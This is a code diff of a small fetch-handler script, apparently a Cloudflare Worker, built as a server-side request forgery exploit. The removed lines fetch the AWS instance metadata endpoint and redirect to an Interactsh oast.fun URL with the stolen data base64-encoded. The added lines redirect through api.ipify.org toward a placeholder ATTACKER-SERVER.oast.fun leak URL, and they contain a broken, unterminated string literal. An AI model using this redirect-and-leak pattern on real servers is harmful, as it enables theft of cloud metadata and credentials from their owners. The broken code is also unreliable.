@@ -1,14 +1,11 @@
 export default {
   async fetch(request) {
-    // 1. Redirect the server to AWS metadata
-    const awsMetadataUrl = "http://169.254.169.254/latest/meta-data/hostname";
+    // Step 1: Redirect the VULNERABLE SERVER to AWS metadata
+    // const awsUrl = "http://169.254.169.254/latest/meta-data/hostname";
+    const awsUrl = "https://api.ipify.org/;
     
-    // 2. Fetch the metadata (server will do this internally)
-    const metadataResponse = await fetch(awsMetadataUrl);
-    const data = await metadataResponse.text();
-
-    // 3. Redirect AGAIN to Interactsh with the data
-    const interactshUrl = `https://bjgibppjensgmxvguqwdfbtbu11f2es3z.oast.fun/leak?data=${btoa(data)}`;
-    return Response.redirect(interactshUrl, 302);
+    // Step 2: Force the server to include AWS data in the URL path/params
+    const interactshUrl = "https://ATTACKER-SERVER.oast.fun/leak?url=";
+    return Response.redirect(`${awsUrl}?redirect=${encodeURIComponent(interactshUrl)}`, 302);
   }
 };
